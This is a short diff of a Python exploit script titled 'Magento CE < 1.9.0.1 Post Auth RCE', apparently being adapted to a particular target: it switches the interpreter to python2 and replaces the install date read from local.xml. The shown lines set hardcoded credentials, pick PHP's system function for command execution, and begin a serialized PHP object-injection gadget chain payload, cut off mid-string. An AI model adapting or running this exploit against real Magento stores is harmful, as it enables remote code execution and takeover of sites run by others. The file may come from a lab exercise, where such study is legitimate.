@@ -1,4 +1,4 @@
-#!/usr/bin/python3
+#!/usr/bin/env python2
 # Exploit Title: Magento CE < 1.9.0.1 Post Auth RCE
 # Google Dork: "Powered by Magento"
 # Date: 08/18/2015
@@ -32,7 +32,7 @@ arg = sys.argv[2]
 username = 'forme'
 password = 'forme'
 php_function = 'system'  # Note: we can only pass 1 argument to the function
-install_date = 'Sat, 15 Nov 2014 20:27:57 +0000'  # This needs to be the exact date from /app/etc/local.xml
+install_date = 'Wed, 08 May 2019 07:23:09 +0000'  # This needs to be the exact date from /app/etc/local.xml
 
 # POP chain to pivot into call_user_exec
 payload = 'O:8:\"Zend_Log\":1:{s:11:\"\00*\00_writers\";a:2:{i:0;O:20:\"Zend_Log_Writer_Mail\":4:{s:16:' \
